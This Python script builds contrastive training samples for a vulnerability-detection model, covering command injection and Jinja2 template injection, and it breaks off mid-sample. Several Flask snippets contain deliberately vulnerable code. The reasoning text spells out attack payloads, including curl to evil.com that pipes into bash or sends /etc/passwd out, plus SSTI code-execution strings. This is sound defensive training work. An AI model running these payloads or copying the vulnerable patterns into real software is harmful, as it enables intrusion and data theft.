"""
CCoT（Contrastive Chain-of-Thought）对比训练样本 —— 针对顽固偏见与概念混淆。

设计依据：docs/改进.md 第三/四节
  - shell=True/subprocess 偏见是预训练先验，LoRA r=8 撼动不了（3 个 FP）
  - SSTI from_string 概念混淆（typical_23 FN + safe_15 FP 镜像错误）
  - typical_19 推理对结论错的"结论漂移"

CCoT 原理（2025, SOLAV Journal，在 Phi-2 上 +12.5% 准确率）：
  训练数据不仅含正确推理，还显式标注错误推理路径，教模型识别"条件反射"
  是错误的。与现有 SFT 流程兼容，无需额外框架。

样本格式（assistant 内容）：
  ### 错误推理路径（条件反射，需识别并避免）：
  [模型常见的偏见/幻觉推理]

  以上推理的问题：[指出错误原因]

  ### 正确推理路径：
  [基于代码语义的逐步推理]

  ### 最终结论：
  ```json
  {...}
  ```

样本分布（22 条）：
  A. shell=True 偏见（8 条）：列表 subprocess 安全 / shlex 转义安全 / shell=True 漏洞
  B. SSTI 概念混淆（8 条）：用户控制模板=漏洞 / 固定模板=安全 / autoescape 防护
  C. 结论一致性（6 条）：推理识别风险→结论必须一致，杜绝 typical_19 式漂移

用法：
  cd /home/zane/文档/code/毕业设计
  PYTHONPATH=. /home/zane/miniconda3/envs/AI/bin/python \
      experiments/exp_06_finetune/scripts/supplement_ccot_contrastive.py
"""

import json
import os
import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(PROJECT_ROOT))

from graduation_project.prompts import SYSTEM_PROMPT_LITE, build_user_prompt

OUTPUT_FILE = PROJECT_ROOT / "experiments/exp_06_finetune/data/supplement_ccot_contrastive.jsonl"

SAMPLES = []


def add(code, language, filename, has_vulnerability, vuln_type, risk_level,
        source, sink, explanation, fix_suggestion,
        incorrect_reasoning, incorrect_flaw, correct_reasoning):
    """添加一条 CCoT 对比样本。

    Args:
        incorrect_reasoning: 错误推理路径文本（模型常见的偏见/幻觉）
        incorrect_flaw: 指出错误推理的问题所在
        correct_reasoning: 正确推理路径文本（基于代码语义的逐步分析）
        其余字段同 supplement_7b_weakness.py 的 add()。
    """
    SAMPLES.append({
        "code": code.strip(),
        "language": language,
        "filename": filename,
        "has_vulnerability": has_vulnerability,
        "vulnerability_type": vuln_type,
        "risk_level": risk_level,
        "source": source,
        "sink": sink,
        "explanation": explanation,
        "fix_suggestion": fix_suggestion,
        "incorrect_reasoning": incorrect_reasoning.strip(),
        "incorrect_flaw": incorrect_flaw.strip(),
        "correct_reasoning": correct_reasoning.strip(),
    })


# ===========================================================================
# 类别 A: shell=True 偏见（8 条）
# 针对改进文档第一节 A 类错误：safe_03/08、noise_06 三个 FP
# 模型见到 subprocess/shell 就条件反射判"漏洞"，不读代码实际语义。
# ===========================================================================

# --- A1: 列表形式 subprocess + shell=False（安全） ---
add(
    """
import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    result = subprocess.run(
        ["ping", "-c", "1", host],
        capture_output=True,
        text=True,
        timeout=5
    )
    return result.stdout
""",
    "python",
    "ccot_subprocess_list_ping.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "subprocess.run 使用列表参数 ['ping', '-c', '1', host]，shell 默认为 False，参数直接传给 execvp 系统调用，不经过 shell 解释器。即使用户输入 host='; rm -rf /'，分号也只是 ping 命令的参数字面量，不会被解释为命令分隔符",
    "no fix needed",
    """
host 是用户输入，subprocess 执行命令，所以存在命令注入风险。攻击者传入 host="; rm -rf /" 就可以执行任意命令。shell=True 使得分号被解释为命令分隔符，导致命令注入。""",
    """
问题：模型没读代码实际内容。代码用的是列表参数 ["ping", "-c", "1", host]，shell 参数未显式设置（默认 False）。列表形式下参数直接传给 execvp，不经 shell 解释，分号不会被解释为命令分隔符。模型凭空捏造了 shell=True。""",
    """
1. 污染源：request.args.get('host') 获取用户输入。
2. 危险 sink：subprocess.run(...) 执行外部命令。
3. 数据流追踪：host → 作为列表 ["ping", "-c", "1", host] 的最后一个元素 → subprocess.run。
4. 防御评估（关键）：
   (a) 参数是列表形式 ["ping", "-c", "1", host]，不是字符串拼接。
   (b) shell 参数未显式设置，subprocess.run 默认 shell=False。
   (c) shell=False 时，参数列表直接传递给 execvp 系统调用，每个元素作为独立参数，不经过 shell 解释器。
   (d) 即使用户输入 host="; rm -rf /"，分号也只是 ping 命令的 -c 1 后面跟的参数字面量（ping 会报错"unknown host"），不会被 shell 解释为命令分隔符。
   (e) timeout=5 防止命令挂起。
5. 结论：列表参数 + shell=False 是命令注入的标准防御方案，代码安全。"""
)

# --- A2: 列表形式 subprocess 传 IP（安全） ---
add(
    """
import subprocess
import re
from flask import Flask, request

app = Flask(__name__)


@app.route("/nslookup")
def nslookup():
    ip = request.args.get("ip", "")
    if not re.match(r"^\\d{1,3}(\\.\\d{1,3}){3}$", ip):
        return "Invalid IP", 400
    result = subprocess.run(
        ["nslookup", ip],
        capture_output=True,
        text=True
    )
    return result.stdout
""",
    "python",
    "ccot_subprocess_list_nslookup_ip.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "双重防护：(1) 正则白名单校验 IP 格式（只允许 x.x.x.x 数字格式）；(2) subprocess.run 使用列表参数 ['nslookup', ip]，shell 默认 False，不经 shell 解释器",
    "no fix needed",
    """
subprocess 执行命令，用户输入 ip 进入命令参数，存在命令注入。虽然代码用了列表，但 subprocess.run 可能被绕过。""",
    """
问题：模型对 subprocess 有条件反射式恐惧，没有具体说明列表形式如何被绕过。实际上列表形式 + shell=False 是标准安全写法，无法被 shell 元字符绕过。此外代码还有正则白名单校验 IP 格式。""",
    """
1. 污染源：request.args.get('ip') 获取用户输入。
2. 危险 sink：subprocess.run(['nslookup', ip]) 执行命令。
3. 数据流追踪：ip → 正则白名单校验 → 列表参数 → subprocess.run(shell=False)。
4. 防御评估（双重防护）：
   (a) 正则 re.match(r"^\\d{1,3}(\\.\\d{1,3}){3}$", ip) 白名单校验，只允许点分十进制 IP 格式，
       拒绝包含 ; | & $ 等特殊字符的输入。
   (b) subprocess.run(["nslookup", ip]) 使用列表形式，shell 默认 False，
       参数直接传给 execvp，不经过 shell 解释器。
   (c) 即使正则校验被绕过（实际上不会），列表形式 + shell=False 也能阻止命令注入。
5. 结论：正则白名单 + 列表形式 shell=False 双重防护，有效阻止命令注入。代码安全。"""
)

# --- A3: shlex.quote 转义 + shell=True（安全） ---
add(
    """
import subprocess
import shlex
from flask import Flask, request

app = Flask(__name__)


@app.route("/echo")
def echo():
    text = request.args.get("text", "")
    safe_text = shlex.quote(text)
    result = subprocess.run(
        f"echo {safe_text}",
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout
""",
    "python",
    "ccot_shlex_quote_echo.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "shlex.quote(text) 将用户输入中所有 shell 特殊字符转义并用单引号包裹，即使 shell=True，转义后的字符串也无法被 shell 解释为命令分隔符或子命令",
    "no fix needed",
    """
代码用了 shell=True，shell=True 就是不安全，用户输入可以注入 shell 命令。即使有 shlex.quote，shell=True 仍然可能被绕过。""",
    """
问题：模型把 shell=True 当成充分条件判漏洞，不信任 shlex.quote 的转义能力。shlex.quote 是 Python 官方提供的 shell 转义函数，会将输入用单引号包裹并转义内部单引号，是 shell=True 场景下的有效防御。模型没有给出 shlex.quote 如何被绕过的具体 payload。""",
    """
1. 污染源：request.args.get('text') 获取用户输入。
2. 危险 sink：subprocess.run(f"echo {safe_text}", shell=True) 执行 shell 命令。
3. 数据流追踪：text → shlex.quote(text) 转义 → f"echo {safe_text}" 字符串拼接 → subprocess.run(shell=True)。
4. 防御评估（shlex.quote 有效）：
   (a) shlex.quote(text) 的实现：将 text 用单引号包裹，并将内部单引号替换为 '\\''（结束单引号、转义单引号、重新开始单引号）。
       例如输入 "hello; rm -rf /" → shlex.quote 返回 "'hello; rm -rf /'"，
       分号被包裹在单引号内，shell 不会将其解释为命令分隔符。
   (b) 输入 "'; rm -rf /" → shlex.quote 返回 "''\\''; rm -rf /'"，
       单引号被转义，整个字符串仍是一个安全的字面量参数。
   (c) shlex.quote 是 Python 官方推荐的 shell 转义函数，正确使用时无已知绕过方法。
5. 结论：shlex.quote 转义有效，即使 shell=True 也不会被命令注入。代码安全。"""
)

# --- A4: shlex.quote + 列表形式（安全，双重防护） ---
add(
    """
import shlex
import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/grep")
def grep():
    pattern = request.args.get("q", "")
    safe_pattern = shlex.quote(pattern)
    result = subprocess.run(
        ["grep", "-i", safe_pattern, "/etc/hosts"],
        capture_output=True,
        text=True,
        timeout=5
    )
    return result.stdout
""",
    "python",
    "ccot_shlex_quote_grep_list.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "双重防护：(1) shlex.quote 转义所有 shell 特殊字符；(2) subprocess.run 使用列表形式 + shell=False，参数不经 shell 解释器。即 shlex.quote 本身已足够，列表形式提供额外层防护",
    "no fix needed",
    """
subprocess 执行 grep 命令，用户输入 pattern 进入命令参数。虽然用了列表，但 grep 可能执行特殊正则导致漏洞。""",
    """
问题：模型把"grep 可能执行特殊正则"当成漏洞，但这不是命令注入问题。代码的 subprocess 用列表形式 + shell=False，用户输入只作为 grep 的搜索模式参数，不会被 shell 解释。正则 ReDoS 是性能问题，不是命令注入。模型在转移焦点。""",
    """
1. 污染源：request.args.get('q') 获取用户输入。
2. 危险 sink：subprocess.run(["grep", "-i", safe_pattern, "/etc/hosts"]) 执行命令。
3. 数据流追踪：pattern → shlex.quote 转义 → 列表参数 → subprocess.run(shell=False)。
4. 防御评估（双重防护有效）：
   (a) shlex.quote(pattern) 转义所有 shell 特殊字符，用单引号包裹。
   (b) 列表形式 ["grep", "-i", safe_pattern, "/etc/hosts"]，shell 默认 False，
       参数直接传给 execvp，不经 shell 解释。
   (c) safe_pattern 作为 grep 的搜索模式参数（第三个参数），grep 会将其当作字面字符串或正则模式处理，
       但这不会导致命令注入，因为 shell 不参与参数解释。
   (d) timeout=5 防止 grep 挂起（如匹配大文件）。
5. 结论：shlex.quote + 列表形式 shell=False 双重防护，有效阻止命令注入。代码安全。"""
)

# --- A5: 硬编码命令 + shell=True（安全，无用户输入） ---
add(
    """
import subprocess

result = subprocess.run(
    "echo 'hello world'",
    shell=True,
    capture_output=True,
    text=True
)
print(result.stdout)
""",
    "python",
    "ccot_shell_true_hardcoded.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "命令字符串是硬编码的 \"echo 'hello world'\"，不含任何用户输入或外部数据。shell=True 虽然使用 shell 解释器，但命令内容固定，无法被注入。命令注入的前提是用户可控输入进入命令字符串",
    "no fix needed",
    """
代码用了 shell=True，shell=True 就是不安全。即使用户输入没有直接出现在代码里，也可能通过其他方式注入。""",
    """
问题：模型捏造了"用户输入"。代码中命令字符串是硬编码的字面量 "echo 'hello world'"，全文无 request.args.get / input() / sys.argv 等用户输入来源。命令注入的前提是用户可控数据进入命令字符串，本代码不满足此前提。模型对 shell=True 有条件反射式恐惧，忽略了这个基本前提。""",
    """
1. 污染源扫描：检查 request.args.get / input() / sys.argv / os.environ 等用户输入来源 —— 均未出现。
2. 危险 sink：subprocess.run("echo 'hello world'", shell=True) 执行 shell 命令。
3. 数据流追踪：命令字符串 "echo 'hello world'" 是字面量，无外部数据流入。
4. 防御评估：
   (a) 命令注入的前提是用户可控输入进入命令字符串。本代码命令是硬编码字面量，不满足此前提。
   (b) shell=True 确实使用 shell 解释器，但解释的是固定字符串 "echo 'hello world'"，无注入可能。
   (c) 代码中没有任何变量、函数参数或外部输入参与命令构建。
5. 结论：硬编码命令 + 无用户输入，不存在命令注入。代码安全。"""
)

# --- A6: os.system 字符串拼接（漏洞） ---
add(
    """
import os
from flask import Flask, request

app = Flask(__name__)


@app.route("/lookup")
def lookup():
    host = request.args.get("host", "")
    os.system(f"nslookup {host}")
    return "done"
""",
    "python",
    "ccot_os_system_concat.py",
    True,
    "CWE-78 命令注入",
    "Critical",
    "request.args.get('host')",
    "os.system(f'nslookup {host}')",
    "用户输入 host 通过 f-string 直接拼接到 os.system 命令字符串，os.system 默认通过 shell 解释执行，攻击者传入 host='; rm -rf /' 即可执行任意命令",
    "改用 subprocess.run(['nslookup', host], shell=False) 列表形式，或用 shlex.quote(host) 转义后再拼接",
    """
代码用了 os.system，但 f-string 拼接了用户输入 host。虽然 os.system 确实执行 shell 命令，但 nslookup 会处理 host 参数，应该不会出问题。""",
    """
问题：模型识别对了 os.system 这个 sink，但低估了 f-string 拼接的危险。os.system 默认通过 /bin/sh -c 执行整个字符串，f"nslookup {host}" 中的 host 是用户输入，攻击者传入 host="; rm -rf /" 会导致 shell 执行两条命令：nslookup  和 rm -rf /。这不是"应该不会出问题"，而是确定的命令注入漏洞。""",
    """
1. 污染源：request.args.get('host') 获取用户输入。
2. 危险 sink：os.system(f'nslookup {host}') 通过 shell 执行命令。
3. 数据流追踪：host → f-string 拼接到命令字符串 → os.system → /bin/sh -c 执行。
4. 防御检查（无）：
   (a) host 未经任何转义或过滤直接拼入 f-string。
   (b) os.system 默认通过 /bin/sh -c "nslookup {host}" 执行，shell 会解释命令字符串中的特殊字符。
   (c) 攻击者传入 host="; rm -rf /" → os.system 执行 "nslookup ; rm -rf /" → shell 执行两条命令。
   (d) 攻击者传入 host="$(curl evil.com/sh.sh | bash)" → os.system 执行命令替换。
5. 攻击路径：host="; cat /etc/passwd" → os.system("nslookup ; cat /etc/passwd") → 泄露系统文件。
6. 结论：用户输入直接拼接到 os.system 命令字符串，存在 CWE-78 命令注入漏洞。"""
)

# --- A7: subprocess.run shell=True + 拼接（漏洞） ---
add(
    """
import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/dig")
def dig():
    domain = request.args.get("domain", "")
    result = subprocess.run(
        f"dig {domain}",
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout
""",
    "python",
    "ccot_subprocess_shell_concat.py",
    True,
    "CWE-78 命令注入",
    "Critical",
    "request.args.get('domain')",
    "subprocess.run(f'dig {domain}', shell=True)",
    "用户输入 domain 通过 f-string 拼接到命令字符串，shell=True 导致 shell 解释器处理整个字符串，攻击者传入 domain='; cat /etc/passwd' 即可执行任意命令",
    "改用 subprocess.run(['dig', domain], shell=False) 列表形式，或用 shlex.quote(domain) 转义后再拼接",
    """
代码用了 subprocess.run，subprocess 是安全的。虽然 shell=True，但 domain 只是 dig 的参数，应该没问题。""",
    """
问题：模型看到 subprocess.run 就判安全，忽略了 shell=True + f-string 拼接的组合。subprocess.run(f"dig {domain}", shell=True) 会通过 /bin/sh -c 执行整个字符串，domain 是用户输入，攻击者传入 domain="; cat /etc/passwd" 会导致 shell 执行两条命令。subprocess.run 本身不是安全保证，shell=True + 字符串拼接才是危险根源。""",
    """
1. 污染源：request.args.get('domain') 获取用户输入。
2. 危险 sink：subprocess.run(f'dig {domain}', shell=True) 通过 shell 执行命令。
3. 数据流追踪：domain → f-string 拼接到命令字符串 → subprocess.run(shell=True) → /bin/sh -c 执行。
4. 防御检查（无）：
   (a) domain 未经 shlex.quote 转义直接拼入 f-string。
   (b) shell=True 导致 shell 解释器处理整个命令字符串，包括 domain 中的特殊字符。
   (c) 攻击者传入 domain="; cat /etc/passwd" → subprocess.run 执行 "dig ; cat /etc/passwd" → shell 执行两条命令。
   (d) 攻击者传入 domain="$(whoami)" → 命令替换被执行。
5. 攻击路径：domain="; curl evil.com/exfil?data=$(cat /etc/passwd)" → 数据外泄。
6. 结论：shell=True + 用户输入 f-string 拼接，存在 CWE-78 命令注入漏洞。"""
)

# --- A8: subprocess 列表形式 + shell=True（安全，shell=True 被忽略） ---
add(
    """
import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/file_count")
def file_count():
    directory = request.args.get("dir", "/tmp")
    result = subprocess.run(
        ["ls", "-l", directory],
        shell=False,
        capture_output=True,
        text=True,
        timeout=5
    )
    return str(result.returncode)
""",
    "python",
    "ccot_subprocess_list_ls.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "subprocess.run 使用列表参数 ['ls', '-l', directory]，shell=False，参数直接传给 execvp，不经 shell 解释。directory 作为 ls 的参数字面量，即使含特殊字符也只是被当作文件名参数（ls 会报错 no such file），不会执行任意命令",
    "no fix needed",
    """
代码执行 ls 命令，用户输入 directory 进入命令参数。即使用列表形式，directory 仍可能导致目录穿越或信息泄露。""",
    """
问题：模型混淆了"命令注入"和"目录穿越/信息泄露"。命令注入是指攻击者能执行任意命令，而 directory 参数在列表形式 + shell=False 下只是 ls 的字面参数，不会被执行为命令。directory 传入 "/etc" 确实会列出 /etc 目录内容（信息泄露），但这是业务逻辑问题（应该做目录白名单），不是命令注入。模型把信息泄露风险夸大为命令注入漏洞。""",
    """
1. 污染源：request.args.get('dir') 获取用户输入。
2. 危险 sink：subprocess.run(['ls', '-l', directory]) 执行命令。
3. 数据流追踪：directory → 列表参数 → subprocess.run(shell=False)。
4. 防御评估（命令注入已防护）：
   (a) 列表形式 ["ls", "-l", directory]，shell=False，参数直接传给 execvp，不经 shell 解释。
   (b) directory 作为 ls 的参数字面量，即使含 "; rm -rf /" 也只是 ls 会尝试列出一个名为 "; rm -rf /" 的文件（报错 no such file）。
   (c) timeout=5 防止命令挂起。
   (d) 注意：directory 传入任意路径（如 "/etc"）会列出该目录内容，这是信息泄露风险（业务逻辑层面），但不是命令注入（CWE-78）。
5. 结论：列表形式 + shell=False 有效阻止命令注入。信息泄露风险应在业务层做目录白名单校验，但不属于命令注入漏洞。"""
)


# ===========================================================================
# 类别 B: SSTI 概念混淆（8 条）
# 针对改进文档第一节 B 类错误：typical_23 FN + safe_15 FP 镜像错误
# 模型不理解 SSTI 的关键在于"谁控制模板内容"，把 from_string 本身当充分条件。
# ===========================================================================

# --- B1: env.from_string + 用户输入拼接模板（漏洞） ---
add(
    """
from flask import Flask, request
from jinja2 import Environment

app = Flask(__name__)
env = Environment()


@app.route("/preview")
def preview():
    user_template = request.args.get("tpl", "")
    template = env.from_string("Welcome: " + user_template)
    return template.render()
""",
    "python",
    "ccot_ssti_from_string_user_input.py",
    True,
    "CWE-94 代码注入（SSTI）",
    "Critical",
    "request.args.get('tpl')",
    "env.from_string('Welcome: ' + user_template)",
    "用户输入 user_template 通过字符串拼接到模板源码，env.from_string 将含用户输入的字符串编译为 Jinja2 模板，template.render() 执行渲染。攻击者可注入 {{ }} 或 {% %} 标签执行任意 Python 表达式",
    "使用固定模板文件 render_template('welcome.html', name=user_template)，或用 SandboxedEnvironment 限制可用功能",
    """
代码用了 env.from_string，from_string 会渲染模板，所以存在 SSTI。模板字符串里有 "Welcome: " 前缀，这是固定内容，应该安全。""",
    """
问题：模型理解反了。SSTI 的关键不在于"是否用了 from_string"，而在于"谁控制模板内容"。本代码模板源码 = "Welcome: " + user_template，user_template 是用户输入，攻击者传入 tpl="{{7*7}}" 会让模板引擎执行 7*7=49。模型被 "Welcome: " 前缀误导，以为模板是固定的，实际上用户输入被拼进了模板源码。""",
    """
1. 污染源：request.args.get('tpl') 获取用户输入。
2. 危险 sink：env.from_string("Welcome: " + user_template) 将字符串编译为 Jinja2 模板并渲染。
3. 数据流追踪：user_template → 字符串拼接到模板源码 → env.from_string 编译 → template.render() 执行。
4. 防御检查（无）：
   (a) 模板源码由用户输入拼接而成，未使用固定模板文件。
   (b) env 是裸 Environment（未启用 autoescape，未使用 SandboxedEnvironment）。
   (c) 攻击者传入 tpl="{{7*7}}" → 模板源码 "Welcome: {{7*7}}" → 渲染结果 "Welcome: 49"。
   (d) 攻击者传入 tpl="{{config}}" → 泄露 Flask 配置（含 SECRET_KEY）。
   (e) 攻击者传入 tpl="{{''.__class__.__mro__[1].__subclasses__()}}" → 遍历 Python 类，可找到 os.system 实现 RCE。
5. 攻击路径：tpl="{{config['SECRET_KEY']}}" → 泄露密钥；tpl="{{__import__('os').popen('id').read()}}" → RCE。
6. 结论：用户输入拼入模板源码经 Jinja2 渲染，存在 CWE-94 SSTI 漏洞。"""
)

# --- B2: env.from_string + 固定模板（安全） ---
add(
    """
from flask import Flask, request
from jinja2 import Environment, select_autoescape

app = Flask(__name__)
env = Environment(autoescape=select_autoescape(["html"]))


@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    template = env.from_string("<h1>Hello {{ name }}</h1>")
    return template.render(name=name)
""",
    "python",
    "ccot_ssti_from_string_fixed_template.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "模板源码是固定字面量 '<h1>Hello {{ name }}</h1>'，用户输入 name 通过 render(name=name) 作为模板变量传入，而非拼接到模板源码。模板引擎只会渲染 {{ name }} 占位符为 name 的值，用户输入中的 {{ }} 不会被二次渲染。autoescape 启用 HTML 转义防 XSS",
    "no fix needed",
    """
代码用了 env.from_string，from_string 会渲染模板，所以存在 SSTI。即使用户输入通过 render 传入，也可能被模板引擎执行。""",
    """
问题：模型把 from_string 当成 SSTI 的充分条件，不理解 SSTI 的关键在于"谁控制模板内容"。本代码模板源码是固定字面量 "<h1>Hello {{ name }}</h1>"，用户输入 name 通过 render(name=name) 作为模板变量传入。模板引擎渲染时，{{ name }} 会被替换为 name 的值（如用户输入 "{{7*7}}"，渲染结果是 "<h1>Hello {{7*7}}</h1>"，7*7 不会被计算）。用户输入中的 {{ }} 不会被二次渲染，因为渲染只发生一次。此外 autoescape 启用了 HTML 转义。""",
    """
1. 污染源：request.args.get('name') 获取用户输入。
2. 危险 sink：env.from_string("<h1>Hello {{ name }}</h1>").render(name=name) 渲染模板。
3. 数据流追踪：name → render(name=name) 作为模板变量传入 → 模板引擎替换 {{ name }} 占位符。
4. 防御评估（关键区别：模板源码固定 vs 用户输入拼接）：
   (a) 模板源码 "<h1>Hello {{ name }}</h1>" 是固定字面量，不含用户输入。
   (b) 用户输入 name 通过 render(name=name) 作为模板变量传入，而非拼接到模板源码。
   (c) 模板引擎渲染时，{{ name }} 占位符被替换为 name 的值。如果 name="{{7*7}}"，
       渲染结果是 "<h1>Hello {{7*7}}</h1>"，7*7 不会被计算（只渲染一次，不会递归渲染变量值）。
   (d) SSTI 的前提是用户控制模板源码（如 env.from_string("Welcome: " + user_input)），
       本代码不满足此前提。
   (e) autoescape=select_autoescape(["html"]) 启用 HTML 转义，防止 XSS。
5. 结论：模板源码固定，用户输入作为变量传入而非拼入模板，不存在 SSTI。代码安全。"""
)

# --- B3: render_template_string + 用户输入拼接（漏洞） ---
add(
    """
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    template = "<h1>Hello " + name + "!</h1>"
    return render_template_string(template)
""",
    "python",
    "ccot_ssti_render_template_string_concat.py",
    True,
    "CWE-94 代码注入（SSTI）",
    "Critical",
    "request.args.get('name')",
    "render_template_string(template)",
    "用户输入 name 通过字符串拼接进模板源码 template，render_template_string 将其编译为 Jinja2 模板并渲染。攻击者传入 name='{{7*7}}' 即可让模板引擎执行 7*7，传入 name='{{config}}' 可泄露 Flask 配置",
    "使用固定模板文件 render_template('greet.html', name=name)，或用 render_template_string('<h1>Hello {{ name }}</h1>', name=name) 变量传入",
    """
代码用了 render_template_string，会渲染模板。但 name 只是 Hello 后面的文本，应该是普通字符串拼接，不是模板注入。""",
    """
问题：模型不理解 render_template_string 会将整个字符串作为 Jinja2 模板编译。template = "<h1>Hello " + name + "!</h1>"，name 被拼入模板源码，攻击者传入 name="{{7*7}}" 会让模板源码变成 "<h1>Hello {{7*7}}!</h1>"，渲染时 7*7 被计算为 49。模型把模板源码拼接和普通字符串拼接混淆了。""",
    """
1. 污染源：request.args.get('name') 获取用户输入。
2. 危险 sink：render_template_string(template) 将字符串编译为 Jinja2 模板并渲染。
3. 数据流追踪：name → 字符串拼接到 template → render_template_string 编译渲染。
4. 防御检查（无）：
   (a) 模板源码 template 由用户输入拼接而成，未使用固定模板。
   (b) render_template_string 会将整个字符串作为 Jinja2 模板编译，{{ }} 和 {% %} 标签会被解析执行。
   (c) 攻击者传入 name="{{7*7}}" → 模板源码 "<h1>Hello {{7*7}}!</h1>" → 渲染 "<h1>Hello 49!</h1>"。
   (d) 攻击者传入 name="{{config}}" → 泄露 Flask 配置。
   (e) 攻击者传入 name="{{__import__('os').popen('id').read()}}" → RCE。
5. 攻击路径：name="{{config['SECRET_KEY']}}" → 泄露密钥。
6. 结论：用户输入拼入模板源码经 Jinja2 渲染，存在 CWE-94 SSTI 漏洞。"""
)

# --- B4: render_template_string + 固定模板 + 变量传入（安全） ---
add(
    """
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route("/greet")
def greet():
    name = request.args.get("name", "")
    return render_template_string("<h1>Hello {{ name }}</h1>", name=name)
""",
    "python",
    "ccot_ssti_render_template_string_fixed.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "模板源码是固定字面量 '<h1>Hello {{ name }}</h1>'，用户输入 name 通过关键字参数 name=name 作为模板变量传入，而非拼接到模板源码。模板引擎只渲染 {{ name }} 占位符为 name 的值，用户输入中的 {{ }} 不会被二次渲染。Flask 默认启用 autoescape 防 XSS",
    "no fix needed",
    """
代码用了 render_template_string，会渲染模板，存在 SSTI 风险。即使 name 通过参数传入，模板引擎也可能执行用户输入中的 {{ }}。""",
    """
问题：模型不理解"模板源码固定 + 变量传入"是安全的。本代码模板源码 "<h1>Hello {{ name }}</h1>" 是固定字面量，name 通过 render_template_string(..., name=name) 作为模板变量传入。渲染时 {{ name }} 被替换为 name 的值，如果 name="{{7*7}}"，渲染结果是 "<h1>Hello {{7*7}}</h1>"，7*7 不会被计算。用户输入中的 {{ }} 不会被二次渲染。""",
    """
1. 污染源：request.args.get('name') 获取用户输入。
2. 危险 sink：render_template_string("<h1>Hello {{ name }}</h1>", name=name) 渲染模板。
3. 数据流追踪：name → 作为模板变量传入 → 模板引擎替换 {{ name }} 占位符。
4. 防御评估（关键：模板源码固定）：
   (a) 模板源码 "<h1>Hello {{ name }}</h1>" 是固定字面量，不含用户输入。
   (b) 用户输入 name 通过关键字参数 name=name 作为模板变量传入，而非拼接到模板源码。
   (c) 模板引擎渲染时，{{ name }} 占位符被替换为 name 的值。如果 name="{{7*7}}"，
       渲染结果是 "<h1>Hello {{7*7}}</h1>"，7*7 不会被计算（渲染只发生一次，不递归渲染变量值）。
   (d) SSTI 的前提是用户控制模板源码，本代码不满足此前提。
   (e) Flask 默认启用 autoescape（Jinja2 的 select_autoescape），防止 XSS。
5. 结论：模板源码固定，用户输入作为变量传入，不存在 SSTI。代码安全。"""
)

# --- B5: Jinja2 Template() + 用户输入拼接（漏洞） ---
add(
    """
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)


@app.route("/render")
def render():
    content = request.args.get("content", "")
    tpl = Template("Content: " + content)
    return tpl.render()
""",
    "python",
    "ccot_ssti_template_concat.py",
    True,
    "CWE-94 代码注入（SSTI）",
    "Critical",
    "request.args.get('content')",
    "Template('Content: ' + content)",
    "用户输入 content 通过字符串拼接到模板源码，Template() 将其编译为 Jinja2 模板。攻击者传入 content='{{7*7}}' 即可让模板引擎执行 7*7，传入 content='{{config}}' 可泄露配置",
    "使用固定模板 tpl = Template('Content: {{ content }}')，通过 tpl.render(content=content) 传入变量",
    """
代码用了 Template()，会创建模板。但 content 只是 Content 后面的文本，是普通字符串拼接，不是模板注入。""",
    """
问题：模型不理解 Template() 会将整个字符串作为 Jinja2 模板编译。tpl = Template("Content: " + content)，content 被拼入模板源码，攻击者传入 content="{{7*7}}" 会让模板源码变成 "Content: {{7*7}}"，渲染时 7*7 被计算。模型把模板源码拼接和普通字符串拼接混淆了。""",
    """
1. 污染源：request.args.get('content') 获取用户输入。
2. 危险 sink：Template("Content: " + content) 将字符串编译为 Jinja2 模板。
3. 数据流追踪：content → 字符串拼接到模板源码 → Template() 编译 → tpl.render() 执行。
4. 防御检查（无）：
   (a) 模板源码由用户输入拼接，未使用固定模板。
   (b) Template() 直接编译字符串为模板对象，无 autoescape，无沙箱。
   (c) 攻击者传入 content="{{7*7}}" → 模板源码 "Content: {{7*7}}" → 渲染 "Content: 49"。
   (d) 攻击者传入 content="{{config}}" → 泄露 Flask 配置。
5. 攻击路径：content="{{__import__('os').popen('id').read()}}" → RCE。
6. 结论：用户输入拼入模板源码经 Jinja2 渲染，存在 CWE-94 SSTI 漏洞。"""
)

# --- B6: Jinja2 Template() + 固定模板（安全） ---
add(
    """
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

GREETING_TPL = Template("<h1>Welcome {{ user }}</h1>")


@app.route("/welcome")
def welcome():
    user = request.args.get("user", "")
    return GREETING_TPL.render(user=user)
""",
    "python",
    "ccot_ssti_template_fixed.py",
    False,
    "none",
    "None",
    "N/A",
    "N/A",
    "模板源码是固定字面量 '<h1>Welcome {{ user }}</h1>'，在模块加载时编译一次。用户输入 user 通过 render(user=user) 作为模板变量传入，而非拼接到模板源码。模板引擎只渲染 {{ user }} 占位符，用户输入中的 {{ }} 不会被二次渲染",
    "no fix needed",
    """
代码用了 Template()，会创建模板，存在 SSTI 风险。用户输入 user 通过 render 传入，模板引擎可能执行用户输入中的 {{ }}。""",
    """
问题：模型把 Template() 当成 SSTI 的充分条件。本代码模板源码 "<h1>Welcome {{ user }}</h1>" 是固定字面量，在模块加载时编译一次（GREETING_TPL 是模块级常量）。用户输入 user 通过 render(user=user) 作为模板变量传入。渲染时 {{ user }} 被替换为 user 的值，如果 user="{{7*7}}"，渲染结果是 "<h1>Welcome {{7*7}}</h1>"，7*7 不会被计算。""",
    """
1. 污染源：request.args.get('user') 获取用户输入。
2. 危险 sink：GREETING_TPL.render(user=user) 渲染模板。
3. 数据流追踪：user → render(user=user) 作为模板变量传入 → 模板引擎替换 {{ user }} 占位符。
4. 防御评估（模板源码固定）：
